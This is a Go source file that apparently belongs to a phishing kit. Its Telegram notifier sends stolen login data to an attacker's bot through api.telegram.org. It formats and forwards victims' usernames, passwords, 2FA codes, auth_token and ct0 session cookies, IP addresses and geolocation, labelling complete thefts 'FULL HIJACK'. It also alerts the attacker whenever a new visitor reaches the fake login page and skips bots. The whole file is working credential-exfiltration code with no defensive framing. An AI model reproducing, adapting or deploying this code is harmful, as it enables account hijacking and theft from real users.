package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// TelegramNotifier sends captured credentials to a Telegram bot.
type TelegramNotifier struct {
	botToken         string
	chatID           string
	client           *http.Client
	notifiedIPs      map[string]bool
	notifiedCaptures map[string]bool
	mu               sync.Mutex
	geo              *geoLookup
}

func newTelegramNotifier(geo *geoLookup) *TelegramNotifier {
	token := strings.TrimSpace(os.Getenv("TELEGRAM_BOT_TOKEN"))
	chatID := strings.TrimSpace(os.Getenv("TELEGRAM_CHAT_ID"))
	if token == "" || chatID == "" {
		log.Println("[telegram] not configured - TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing")
		return nil
	}
	log.Printf("[telegram] configured with chat_id=%s", chatID)
	return &TelegramNotifier{
		botToken:         token,
		chatID:           chatID,
		client:           &http.Client{Timeout: 10 * time.Second},
		notifiedIPs:      make(map[string]bool),
		notifiedCaptures: make(map[string]bool),
		geo:              geo,
	}
}

// NotifyCapture sends notification for FULL capture (has auth_token)
func (t *TelegramNotifier) NotifyCapture(sess *Session) {
	if t == nil || sess == nil {
		return
	}

	// Only notify for captures with auth_token
	if sess.AuthToken == "" || len(sess.AuthToken) < 30 {
		return
	}

	// Only notify once per session
	t.mu.Lock()
	if t.notifiedCaptures[sess.ID] {
		t.mu.Unlock()
		return
	}
	t.notifiedCaptures[sess.ID] = true
	t.mu.Unlock()

	// Get geo if not set
	country := sess.Country
	city := sess.City
	if country == "" && t.geo != nil {
		country, city = t.geo.lookup(sess.IP)
	}

	// Build message
	var msg strings.Builder
	msg.WriteString("━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	msg.WriteString("🎣 <b>FULL CAPTURE</b> 🎣\n")
	msg.WriteString("━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

	// Location
	flag := countryFlag(country)
	location := "Unknown"
	if country != "" {
		location = country
		if city != "" {
			location = city + ", " + country
		}
	}
	msg.WriteString(fmt.Sprintf("%s <b>Location:</b> %s\n", flag, location))
	msg.WriteString(fmt.Sprintf("🌐 <b>IP:</b> <code>%s</code>\n\n", sess.IP))

	// Credentials section
	msg.WriteString("📋 <b>CREDENTIALS</b>\n")
	msg.WriteString("─────────────────────\n")
	
	if sess.Username != "" {
		msg.WriteString(fmt.Sprintf("👤 <b>Username:</b> <code>%s</code>\n", escapeHTML(sess.Username)))
	} else {
		msg.WriteString("👤 <b>Username:</b> <i>not entered</i>\n")
	}
	
	if sess.Password != "" {
		msg.WriteString(fmt.Sprintf("🔑 <b>Password:</b> <code>%s</code>\n", escapeHTML(sess.Password)))
	} else {
		msg.WriteString("🔑 <b>Password:</b> <i>not entered</i>\n")
	}
	
	if sess.TwoFA != "" {
		msg.WriteString(fmt.Sprintf("🔐 <b>2FA Code:</b> <code>%s</code>\n", escapeHTML(sess.TwoFA)))
	}
	
	if sess.UserID != "" {
		msg.WriteString(fmt.Sprintf("🆔 <b>User ID:</b> <code>%s</code>\n", sess.UserID))
	}
	msg.WriteString("\n")

	// Tokens section
	msg.WriteString("🍪 <b>TOKENS</b>\n")
	msg.WriteString("─────────────────────\n")
	msg.WriteString(fmt.Sprintf("<b>auth_token:</b>\n<code>%s</code>\n\n", escapeHTML(sess.AuthToken)))
	
	if sess.CT0 != "" {
		msg.WriteString(fmt.Sprintf("<b>ct0:</b>\n<code>%s</code>\n\n", escapeHTML(sess.CT0)))
	}

	// Stats
	msg.WriteString(fmt.Sprintf("📦 <b>Cookies:</b> %d\n", len(sess.CookieJar)))
	
	// Status
	status := "🔴 Partial"
	if sess.Complete {
		status = "🟢 Complete"
	}
	if sess.Username != "" && sess.Password != "" && sess.AuthToken != "" {
		status = "🟢 FULL HIJACK"
	}
	msg.WriteString(fmt.Sprintf("📊 <b>Status:</b> %s\n", status))
	
	msg.WriteString(fmt.Sprintf("\n⏰ %s", time.Now().Format("02 Jan 2006 • 15:04:05 MST")))

	log.Printf("[telegram] sending capture notification for session %s", sess.ID)
	go t.send(msg.String())
}

// NotifyVisitor sends notification when new visitor hits login page
func (t *TelegramNotifier) NotifyVisitor(ip, country, city, ua string) {
	if t == nil || ip == "" {
		return
	}

	// Skip bots
	if isBot(ip, ua) {
		return
	}

	// Only notify once per IP
	t.mu.Lock()
	if t.notifiedIPs[ip] {
		t.mu.Unlock()
		return
	}
	t.notifiedIPs[ip] = true
	t.mu.Unlock()

	// Get geo if not set
	if country == "" && t.geo != nil {
		country, city = t.geo.lookup(ip)
	}

	flag := countryFlag(country)
	location := "Unknown"
	if country != "" {
		location = country
		if city != "" {
			location = city + ", " + country
		}
	}

	browser, osName := parseUA(ua)

	var msg strings.Builder
	msg.WriteString("━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	msg.WriteString("👁️ <b>NEW VISITOR</b>\n")
	msg.WriteString("━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
	msg.WriteString(fmt.Sprintf("%s <b>Location:</b> %s\n", flag, location))
	msg.WriteString(fmt.Sprintf("🌐 <b>IP:</b> <code>%s</code>\n", ip))
	if browser != "" {
		msg.WriteString(fmt.Sprintf("🔍 <b>Browser:</b> %s\n", browser))
	}
	if osName != "" {
		msg.WriteString(fmt.Sprintf("💻 <b>OS:</b> %s\n", osName))
	}
	msg.WriteString(fmt.Sprintf("\n⏰ %s", time.Now().Format("02 Jan 2006 • 15:04:05 MST")))

	log.Printf("[telegram] sending visitor notification for IP %s", ip)
	go t.send(msg.String())
}

func (t *TelegramNotifier) send(text string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.botToken)

	payload := map[string]interface{}{
		"chat_id":                  t.chatID,
		"text":                     text,
		"parse_mode":               "HTML",
		"disable_web_page_preview": true,
	}

	body, err := json.Marshal(payload)
	if err != nil {
		log.Printf("[telegram] marshal error: %v", err)
		return
	}

	resp, err := t.client.Post(url, "application/json", bytes.NewReader(body))
	if err != nil {
		log.Printf("[telegram] send error: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("[telegram] bad response: %d", resp.StatusCode)
	} else {
		log.Printf("[telegram] message sent successfully")
	}
}

func escapeHTML(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	return s
}

func countryFlag(country string) string {
	flags := map[string]string{
		"United States": "🇺🇸", "US": "🇺🇸", "USA": "🇺🇸",
		"United Kingdom": "🇬🇧", "UK": "🇬🇧", "GB": "🇬🇧",
		"India": "🇮🇳", "IN": "🇮🇳",
		"Germany": "🇩🇪", "DE": "🇩🇪",
		"France": "🇫🇷", "FR": "🇫🇷",
		"Canada": "🇨🇦", "CA": "🇨🇦",
		"Australia": "🇦🇺", "AU": "🇦🇺",
		"Brazil": "🇧🇷", "BR": "🇧🇷",
		"Japan": "🇯🇵", "JP": "🇯🇵",
		"China": "🇨🇳", "CN": "🇨🇳",
		"Russia": "🇷🇺", "RU": "🇷🇺",
		"Italy": "🇮🇹", "IT": "🇮🇹",
		"Spain": "🇪🇸", "ES": "🇪🇸",
		"Mexico": "🇲🇽", "MX": "🇲🇽",
		"Netherlands": "🇳🇱", "NL": "🇳🇱",
		"South Korea": "🇰🇷", "KR": "🇰🇷",
		"Indonesia": "🇮🇩", "ID": "🇮🇩",
		"Turkey": "🇹🇷", "TR": "🇹🇷",
		"Saudi Arabia": "🇸🇦", "SA": "🇸🇦",
		"Poland": "🇵🇱", "PL": "🇵🇱",
		"Argentina": "🇦🇷", "AR": "🇦🇷",
		"Nigeria": "🇳🇬", "NG": "🇳🇬",
		"Egypt": "🇪🇬", "EG": "🇪🇬",
		"Pakistan": "🇵🇰", "PK": "🇵🇰",
		"Philippines": "🇵🇭", "PH": "🇵🇭",
		"Vietnam": "🇻🇳", "VN": "🇻🇳",
		"Thailand": "🇹🇭", "TH": "🇹🇭",
		"Singapore": "🇸🇬", "SG": "🇸🇬",
		"Malaysia": "🇲🇾", "MY": "🇲🇾",
		"UAE": "🇦🇪", "United Arab Emirates": "🇦🇪",
		"Sweden": "🇸🇪", "SE": "🇸🇪",
		"Switzerland": "🇨🇭", "CH": "🇨🇭",
		"Belgium": "🇧🇪", "BE": "🇧🇪",
		"Austria": "🇦🇹", "AT": "🇦🇹",
		"Portugal": "🇵🇹", "PT": "🇵🇹",
		"Greece": "🇬🇷", "GR": "🇬🇷",
		"Ireland": "🇮🇪", "IE": "🇮🇪",
		"Israel": "🇮🇱", "IL": "🇮🇱",
		"South Africa": "🇿🇦", "ZA": "🇿🇦",
		"Ukraine": "🇺🇦", "UA": "🇺🇦",
		"Romania": "🇷🇴", "RO": "🇷🇴",
		"Morocco": "🇲🇦", "MA": "🇲🇦",
	}
	if f, ok := flags[country]; ok {
		return f
	}
	return "🌍"
}

func parseUA(ua string) (browser, os string) {
	ua = strings.ToLower(ua)

	switch {
	case strings.Contains(ua, "edg/"):
		browser = "Edge"
	case strings.Contains(ua, "opr/") || strings.Contains(ua, "opera"):
		browser = "Opera"
	case strings.Contains(ua, "chrome") && !strings.Contains(ua, "edg"):
		browser = "Chrome"
	case strings.Contains(ua, "safari") && !strings.Contains(ua, "chrome"):
		browser = "Safari"
	case strings.Contains(ua, "firefox"):
		browser = "Firefox"
	}

	switch {
	case strings.Contains(ua, "iphone"):
		os = "iOS (iPhone)"
	case strings.Contains(ua, "ipad"):
		os = "iOS (iPad)"
	case strings.Contains(ua, "android"):
		os = "Android"
	case strings.Contains(ua, "mac os"):
		os = "macOS"
	case strings.Contains(ua, "windows nt 10"):
		os = "Windows 10/11"
	case strings.Contains(ua, "windows"):
		os = "Windows"
	case strings.Contains(ua, "linux"):
		os = "Linux"
	}

	return browser, os
}
